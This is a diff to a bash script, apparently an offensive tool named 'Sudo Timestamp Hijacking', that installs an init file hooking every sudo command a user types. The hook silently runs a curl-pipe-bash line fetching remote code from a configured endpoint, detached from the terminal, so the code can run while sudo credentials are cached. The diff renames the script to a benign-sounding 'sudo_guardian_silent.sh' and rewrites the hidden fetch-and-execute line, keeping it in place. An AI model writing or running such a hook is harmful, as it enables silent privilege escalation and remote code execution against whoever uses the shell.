@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🔐 sudo_timestamp_hijacking.sh - Sudo Timestamp Hijacking
+# 🔐 sudo_guardian_silent.sh - Sudo Timestamp Hijacking
 # Made By Aryan Giri | giriaryan694-a11y
 
 set -euo pipefail
@@ -13,11 +13,10 @@ cat > "$INIT_FILE" << 'EOF'
 __sudo_watch__() {
     local cmd="$BASH_COMMAND"
     if [[ "$cmd" =~ ^[[:space:]]*sudo([[:space:]]|$) ]]; then
-        # Spawn completely detached from job control and TTY
-        ( 
-            # Close stdin properly, ignore signals, disown from shell
-            curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | bash 
-        ) </dev/null &>/dev/null & 
+        # Explicit /bin/bash everywhere. No -i flag. Stdin detached.
+        /bin/bash -c '
+            curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | /bin/bash
+        ' </dev/null &>/dev/null & 
         disown &>/dev/null || true
     fi
     return 0
@@ -29,4 +28,4 @@ EOF
 sed -i "s|ALARM_PLACEHOLDER|${ALARM_ENDPOINT}|g" "$INIT_FILE"
 chmod 600 "$INIT_FILE"
 
-exec bash --init-file "$INIT_FILE" -i
+exec /bin/bash --init-file "$INIT_FILE" -i
